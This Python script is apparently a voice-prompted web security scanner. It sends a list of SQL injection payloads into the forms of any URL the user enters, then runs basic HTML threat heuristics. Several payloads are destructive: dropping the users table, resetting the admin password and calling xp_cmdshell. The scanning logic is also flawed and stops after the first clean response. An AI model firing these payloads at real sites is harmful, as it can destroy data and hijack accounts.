import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import re
import pyttsx3

def perform_security_scan():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

    engine = pyttsx3.init()
    engine.setProperty('rate', 150)

    def speak(text, print_message=True):
        if print_message:
            print(text)
        engine.say(text)
        engine.runAndWait()

    def get_authorization():
        speak("Sure. Launching the automated security scanning program. Are you authorized to run a security scan on your preferred website? (yes/no)")
        response = input().lower()
        return response == "yes"

    def is_valid_url(url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except ValueError:
            return False

    def listen():
        if not get_authorization():
            speak("You are not allowed to run a security scan without permission.")
            return None

        while True:
            speak("Please enter the URL you want to check:")
            url = input()

            if is_valid_url(url):
                return url
            else:
                speak("Invalid link. Make sure to include 'http://' or 'https://' in the URL. Do you want to try again? (yes/no)")
                response = input().lower()
                if response != "yes":
                    return None

    # Function to get all forms
    def get_forms(url):
        soup = BeautifulSoup(s.get(url).content, "html.parser")
        return soup.find_all("form")

    def form_details(form):
        detailsOfForm = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get")
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })

        detailsOfForm['action'] = action
        detailsOfForm['method'] = method
        detailsOfForm['inputs'] = inputs
        return detailsOfForm

    def vulnerable(response):
        if response is None:
            # Handle the case where the response is None (e.g., failed HTTP request)
            return False

        errors = {"quoted string not properly terminated",
                  "unclosed quotation mark after the character string",
                  "you have an error in your SQL syntax"
                 }
        for error in errors:
            if error in response.content.decode().lower():
                return True
        return False

    # Additional SQL injection test data
    sql_injection_payloads = [
        "1' OR '1'='1'; --",
        '1" OR "1"="1"; --',
        "' OR '1'='1' --",
        '" OR "1"="1" --',
        "1' OR '1'='1'; --",
        '1" OR "1"="1"; --',
        "' OR '1'='1'; DROP TABLE users; --",
        '" OR "1"="1"; DROP TABLE users; --',
        "'; DROP TABLE users; --",
        '"; DROP TABLE users; --',
        "UNION SELECT 1, version(), user(), database(); --",
        "'; EXEC xp_cmdshell('ping 127.0.0.1'); --",
        '" UNION SELECT null, username, password FROM users; --',
        "' OR '1'='1'; INSERT INTO audit_log (event) VALUES ('SQL Injection'); --",
        "' OR '1'='1'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "' OR '1'='1'; SELECT * FROM confidential_data; --",
        '" OR "1"="1"; SELECT * FROM confidential_data; --',
        "' OR '1'='1'; SELECT * FROM information_schema.tables; --",
        '" OR "1"="1"; SELECT * FROM information_schema.tables; --',
        "' OR '1'='1'; SELECT * FROM information_schema.columns WHERE table_name='users'; --",
        "' OR '1'='1'; SELECT * FROM users WHERE username='admin' AND password='admin'; --",
        "' OR '1'='1'; SELECT COUNT(*) FROM information_schema.tables; --",
        '" OR "1"="1"; SELECT COUNT(*) FROM information_schema.tables; --',
        "' OR '1'='1'; SELECT * FROM information_schema.tables WHERE table_schema='public'; --",
        "' OR '1'='1'; SELECT * FROM information_schema.tables WHERE table_name LIKE 'user%'; --",
        "' OR '1'='1'; SELECT * FROM information_schema.columns WHERE table_name='users'; --",
        "' OR '1'='1'; SELECT * FROM users WHERE username='admin' AND password LIKE 'a%'; --",
        "' OR '1'='1'; SELECT * FROM users WHERE username LIKE 'a%'; --"
    ]

    def sql_injection_scan(url):
        forms = get_forms(url)
        speak(f"[+] Detected {len(forms)} forms on {url}.")

        for form in forms:
            details = form_details(form)

            # Scanning with SQL injection test data
            speak(f"Scanning {details['method'].upper()} method with SQL injection test data.")

            res = None  # Initialize res to None before the loop

            for payload in sql_injection_payloads:
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        data[input_tag['name']] = input_tag["value"] + payload
                    elif input_tag["type"] != "submit":
                        data[input_tag['name']] = f"test{payload}"

                print(url)
                form_details(form)

                if details["method"] == "post":
                    res = s.post(url, data=data)
                elif details["method"] == "get":
                    res = s.get(url, params=data)
                if vulnerable(res):
                    speak("SQL injection attack vulnerability detected.")
                    speak(f"In the link: {url}")
                else:
                    speak("No SQL injection attack vulnerability detected.")
                    break

        # Check URL security after SQL injection scan
        speak("Now checking for URL threats...")
        check_for_url_threats(url)

    def fetch_html_content(url):
        try:
            response = s.get(url)
            response.raise_for_status()  # Check for HTTP errors
            return response.text
        except requests.RequestException as e:
            speak(f"Error fetching URL: {e}")
            return None

    def analyze_html_content(html_content):
        threats = []

        if html_content:
            soup = BeautifulSoup(html_content, 'html.parser')

            # Check for known malicious script patterns
            script_tags = soup.find_all('script')
            for script_tag in script_tags:
                script_content = script_tag.get_text().lower()
                if re.search(r'(eval\(|document\.write\(|exec\()', script_content):
                    threats.append("Malicious script detected")

            # Check for iframes with suspicious sources
            iframe_tags = soup.find_all('iframe')
            for iframe_tag in iframe_tags:
                src = iframe_tag.get('src', '').lower()
                if src.startswith('http://') or src.startswith('https://'):
                    # Add more conditions based on known malicious domains
                    if 'malicious-domain.com' in src:
                        threats.append(f"Suspicious iframe source: {src}")

            # Check for suspicious links
            a_tags = soup.find_all('a')
            for a_tag in a_tags:
                href = a_tag.get('href', '').lower()
                if href.startswith('http://') or href.startswith('https://'):
                    # Add more conditions based on known malicious domains
                    if 'malicious-domain.com' in href:
                        threats.append(f"Suspicious link: {href}")

            # Check for hidden input fields in forms (potential for malicious data)
            input_tags = soup.find_all('input', type='hidden')
            if input_tags:
                threats.append("Hidden input fields detected in forms")

            # Check for form actions pointing to external URLs
            form_tags = soup.find_all('form')
            for form_tag in form_tags:
                action = form_tag.get('action', '').lower()
                if action.startswith('http://') or action.startswith('https://'):
                    # Add more conditions based on known malicious domains
                    if 'malicious-domain.com' in action:
                        threats.append(f"Suspicious form action: {action}")

            # Add more checks as needed, such as analyzing attributes, form actions, etc.

        return threats

    def check_for_url_threats(url):
        html_content = fetch_html_content(url)
        detected_threats = analyze_html_content(html_content)

        if detected_threats:
            speak("Potential threats detected:")
            for threat in detected_threats:
                speak(threat, print_message=False)
        else:
            speak("No threats detected in the URL.")

    urlToBeChecked = listen()
    if urlToBeChecked:
        sql_injection_scan(urlToBeChecked)

if __name__ == "__main__":
    perform_security_scan()
